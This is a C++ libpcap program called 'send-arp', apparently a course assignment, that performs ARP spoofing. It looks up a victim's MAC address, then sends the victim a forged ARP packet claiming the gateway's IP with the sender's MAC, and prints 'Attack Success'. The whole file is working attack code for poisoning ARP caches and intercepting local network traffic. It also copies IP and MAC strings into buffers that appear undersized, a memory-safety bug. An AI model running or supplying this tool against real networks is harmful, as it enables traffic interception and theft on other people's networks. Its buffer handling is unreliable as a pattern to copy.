#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// https://stackoverflow.com/questions/17909401/linux-c-get-default-interfaces-ip-address
bool get_s_ip(char* dev, char* ip) {
    struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);

	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);

	close(s);

	Ip my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	std::string str = std::string(my_ip);

	if (str.length() > 0) {
		strcpy(ip, str.c_str());
		return true;
	}
	
	return false;
}

bool get_s_mac(char* dev, char* mac) {
	std::string mac_addr;
	std::ifstream mac_file("/sys/class/net/" + std::string(dev) + "/address");
	std::string str((std::istreambuf_iterator<char>(mac_file)), std::istreambuf_iterator<char>());

	if (str.length() > 0) {
		strcpy(mac, str.c_str());
		return true;
	}
	
	return false;
}

bool get_d_mac(pcap_t* handle, char* s_mac, char* s_ip, char* d_ip, char* d_mac) {
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(s_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(s_mac);
	packet.arp_.sip_ = htonl(Ip(s_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(d_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {
		return false;
	}

	return true;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char s_ip[Ip::SIZE];
	if (get_s_ip(dev, s_ip)) {
		printf("My IP address: %s\n", s_ip);
	} else {
		printf("couldn't get IP address\n");
		return -1;
	}

	char s_mac[Mac::SIZE];
	if (get_s_mac(dev, s_mac)) {
		printf("My MAC address: %s\n", s_mac);
	} else {
		printf("couldn't get MAC address\n");
		return -1;
	}

	for(int i = 2; i < argc; i += 2) {
		char victim_ip[Ip::SIZE], gateway_ip[Ip::SIZE];
		char d_mac[Mac::SIZE];

		strncpy(victim_ip, argv[i], Ip::SIZE);
		strncpy(gateway_ip, argv[i+1], Ip::SIZE);

		EthArpPacket packet;

		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = Mac(s_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(s_mac);
		packet.arp_.sip_ = htonl(Ip(s_ip));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(victim_ip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);

			if (res == 0) continue;
			if (res == -1 || res == -2) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthHdr* eth = (EthHdr*)packet;
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));

			if (eth->type() == EthHdr::Arp && arp->op() == ArpHdr::Reply && arp->sip() == Ip(victim_ip)) {
				strncpy(d_mac, arp->smac().operator std::string().c_str(), Mac::SIZE);
				printf("Sender MAC address: %s\n", d_mac);
				break;
			}
		}

		packet.eth_.dmac_ = Mac(d_mac);
		packet.arp_.sip_ = htonl(Ip(gateway_ip));
		packet.arp_.tmac_ = Mac(d_mac);

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		else {
			printf("Attack Success\n");
		}
	}

	pcap_close(handle);
}